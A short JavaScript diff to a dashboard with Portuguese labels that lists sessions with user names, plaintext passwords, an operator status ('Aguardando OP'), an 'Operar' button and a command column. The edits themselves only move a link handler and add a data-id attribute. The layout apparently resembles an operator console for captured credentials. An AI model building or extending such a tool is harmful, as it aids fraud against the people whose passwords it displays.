@@ -195,6 +195,7 @@ const panel = (() => {
         const roleTime = tr.querySelector(`td[role="time"]`)
         const roleCommand = tr.querySelector(`td[role="command"]`)
 
+
         roleCommand.innerHTML = status
         roleType.innerHTML = type
 
@@ -232,7 +233,7 @@ const panel = (() => {
         tr.innerHTML = `
         <th scope="row" role="id"># ${id}</th>
         <td><strong role="operator">Aguardando OP</strong></td>
-        <td><a class="btn btn-success btn-sm linkOperator" href="#" role="button">Operar</a></td>
+        <td><a class="btn btn-success btn-sm linkOperator" data-id="${id}" href="#" role="button">Operar</a></td>
         <td role="user">${user}</td>
         <td role="password">${password ? password : ''}</td>
         <td role="type">${type}</td>
@@ -241,10 +242,6 @@ const panel = (() => {
         `
 
         const roleTime = tr.querySelector('td[role="time"]')
-
-        const link = tr.querySelector('.linkOperator');
-
-        if(link) openNewTab(link)
 
         let time = new Date() - new Date(createdAt)
 
@@ -256,6 +253,11 @@ const panel = (() => {
         time = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)
 
         roleTime.innerHTML = time
+
+        const link = tr.querySelector('.linkOperator');
+
+
+        if(link) openNewTab(link)
 
         setInterval(() => {
             if (seconds == 59) {
